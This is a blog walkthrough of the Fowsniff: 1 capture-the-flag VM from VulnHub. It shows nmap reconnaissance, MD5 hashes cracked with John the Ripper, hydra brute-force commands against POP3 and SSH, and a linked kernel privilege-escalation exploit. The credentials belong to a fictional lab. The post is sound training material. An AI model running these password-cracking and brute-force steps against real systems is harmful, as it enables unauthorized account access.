---
layout: post
title: "Fowsniff: 1 Walkthrough"
subtitle: "I Smell Foul Play"
date: 2018-11-23 14:59:31 +0000
category: Walkthrough
tags: [VulnHub, Fowsniff]
comments: false
image:
  feature: fowsniff-1-walkthrough.jpg
  credit: stevepb / Pixabay
  creditlink: https://pixabay.com/en/mistake-spill-slip-up-accident-876597/
---

This post documents the complete walkthrough of Fowsniff: 1, a boot2root [VM][1] created by [berzerk0][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

Fowsniff Corp got breached!

```
       WHAT SECURITY?

            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |
|       .oooO                |
|        (   )   Oooo.       |
+---------\ (----(   )-------+
           \\_)    ) /
                 (_/


Fowsniff Corp got pwn3d by B1gN1nj4!


No one is safe from my 1337 skillz!
```

### Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.30.129
...
PORT    STATE SERVICE REASON         VERSION
22/tcp  open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
110/tcp open  pop3    syn-ack ttl 64 Dovecot pop3d
|_pop3-capabilities: RESP-CODES PIPELINING SASL(PLAIN) UIDL USER AUTH-RESP-CODE TOP CAPA
143/tcp open  imap    syn-ack ttl 64 Dovecot imapd
|_imap-capabilities: IDLE more listed LITERAL+ ID post-login have IMAP4rev1 OK capabilities AUTH=PLAINA0001 SASL-IR Pre-login LOGIN-REFERRALS ENABLE
```

`nmap` finds `22/tcp`, `80/tcp`, `110/tcp`, `143/tcp`. Pretty common services—nothing out of the ordinary. In any case, let's start with `http` first.

Here's what the site looks like.

![f77a9c89.png](/assets/images/posts/fowsniff-1-walkthrough/f77a9c89.png)

WTF??!! Are you serious?

Scrolling down, you'll see what went wrong at Fowsniff Corp.

![506e5d19.png](/assets/images/posts/fowsniff-1-walkthrough/506e5d19.png)

They are not lying when they say the attackers may release sensitive information through Twitter.

![658278d2.png](/assets/images/posts/fowsniff-1-walkthrough/658278d2.png)

Let's see what the attackers have to offer.

```
FOWSNIFF CORP PASSWORD LEAK
            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |         
|       .oooO                |         
|        (   )   Oooo.       |         
+---------\ (----(   )-------+
           \\_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!


mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e

Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!

Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!

MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P

l8r n00bz!

B1gN1nj4

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-
This list is entirely fictional and is part of a Capture the Flag educational challenge.

All information contained within is invented solely for this purpose and does not correspond
to any real persons or organizations.

Any similarities to actual people or entities is purely coincidental and occurred accidentally.
```

### Password Recovery

Let's recover the passwords from those hashes with John the Ripper. Yummy!

```
# /opt/john/john -format=raw-md5 --show hashes.txt
mauer@fowsniff:mailcall
mustikka@fowsniff:bilbo101
tegel@fowsniff:apples01
baksteen@fowsniff:skyler22
seina@fowsniff:scoobydoo2
mursten@fowsniff:carp4ever
parede@fowsniff:orlando12
sciana@fowsniff:07011972
```

Eight out of nine recovered. Impressive.

### Password Verification

Now, let's verify who has access to what with `hydra`.

```
# hydra -L usernames.txt -P passwords.txt -e nsr pop3://192.168.30.129
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-11-24 09:19:19
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 96 login tries (l:8/p:12), ~6 tries per task
[DATA] attacking pop3://192.168.30.129:110/
[110][pop3] host: 192.168.30.129   login: seina   password: scoobydoo2
[STATUS] 96.00 tries/min, 96 tries in 00:01h, 1 to do in 00:01h, 16 active
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-11-24 09:20:29
```

Hmm. Someone didn't change their password after the breach.

### Popping Emails

I know it's unethical to read other's email but the temptation is too great. Can't help it, let's read `seina`'s email then.

![3b31d0de.png](/assets/images/posts/fowsniff-1-walkthrough/3b31d0de.png)

Now now now, what do we have here? SSH password??!!

### Password Verification Redux

Let's see who hasn't change their password.

```
# hydra -L usernames.txt -p 'S1ck3nBluff+secureshell' ssh://192.168.30.129
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-11-24 09:28:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:8/p:1), ~1 try per task
[DATA] attacking ssh://192.168.30.129:22/
[22][ssh] host: 192.168.30.129   login: baksteen   password: S1ck3nBluff+secureshell
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-11-24 09:28:55
```

Caught in action. `baksteen` is in trouble.

### Low-Privilege Shell

Armed with the SSH password, let's give ourselves a low-privilege shell.

![4e189efa.png](/assets/images/posts/fowsniff-1-walkthrough/4e189efa.png)

Boom. I'm in.

### Privilege Escalation

During enumeration of `baksteen`'s account, I notice the kernel (4.4.0-116-generic) is vulnerable to a local privilege escalation [exploit](https://www.exploit-db.com/exploits/44298/).

`gcc` is also not installed on `fowsniff`. No problem. I can compile the exploit on my attacking machine and transfer it over with `scp`.

![27f32891.png](/assets/images/posts/fowsniff-1-walkthrough/27f32891.png)

Damn. This is too easy.

![f45678ec.png](/assets/images/posts/fowsniff-1-walkthrough/f45678ec.png)

### What's the Flag?

Getting the flag with a `root` shell is trivial.

![a55aa93d.png](/assets/images/posts/fowsniff-1-walkthrough/a55aa93d.png)

:dancer:

[1]: https://www.vulnhub.com/entry/fowsniff-1,262/
[2]: https://twitter.com/@berzerk0
[3]: https://www.vulnhub.com/
